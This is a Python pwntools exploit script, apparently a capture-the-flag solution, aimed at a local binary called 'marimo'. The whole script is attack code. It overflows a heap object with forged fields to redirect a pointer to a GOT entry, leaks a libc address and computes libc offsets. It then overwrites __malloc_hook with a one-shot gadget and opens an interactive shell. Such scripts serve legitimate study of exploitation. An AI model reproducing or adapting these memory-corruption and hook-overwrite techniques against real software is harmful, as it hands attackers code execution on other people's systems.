from pwn import *
import time
s= process("./marimo")

s.recvuntil(">> ")
s.sendline("show me the marimo")
s.recvuntil(">> ")
s.sendline("aaaa")
s.recvuntil(">> ")
s.sendline("aaaa")


s.recvuntil(">> ")
s.sendline("show me the marimo")
s.recvuntil(">> ")
s.sendline("bbbb")
s.recvuntil(">> ")
s.sendline("bbbb")

time.sleep(30)
print "time over"
s.recvuntil(">> ")
s.sendline("V")
s.recvuntil(">> ")
s.sendline("0")
s.recvuntil(">> ")
s.sendline("M")
s.recvuntil(">> ")
s.sendline('a'*40+p64(0x21)+p64(0x15abb684e)+p64(0x603018))
s.recvuntil(">> ")
s.sendline("B")
s.recvuntil(">> ")
s.sendline("V")
s.recvuntil(">> ")
s.sendline("1")
print s.recvuntil("name : ")
leaked_libc = u64(s.recv(6).ljust(8, '\x00'))
libc_base = leaked_libc - 0x6f690
oneshot_gadget = libc_base + 0x4526a
oneshot_gadget = libc_base + 0xf02a4
malloc_hook = libc_base + 0x3c4b10
log.info("libc_base : "+hex(libc_base))
log.info("puts : "+hex(leaked_libc))
log.info("oneshot_gadget : "+hex(oneshot_gadget))
log.info("malloc_hook : "+hex(malloc_hook))
s.recvuntil(">> ")
s.sendline("B")
s.recvuntil(">> ")
s.sendline("V")
s.recvuntil(">>")
s.sendline("0")
s.recvuntil(">> ")
s.sendline("M")
s.recvuntil(">> ")
s.sendline('a'*40+p64(0x21)+p64(0x15abb684e)+p64(0x603018)+p64(malloc_hook))
s.recvuntil(">> ")
s.sendline("B")
s.recvuntil(">> ")
s.sendline("V")
s.recvuntil(">> ")
s.sendline("1")
print s.recvuntil(">> ")
s.sendline("M")
print s.recvuntil(">> ")
s.sendline(p64(oneshot_gadget))
s.recvuntil(">> ")
s.sendline("B")
s.recvuntil(">> ")
s.sendline("show me the marimo")
s.interactive()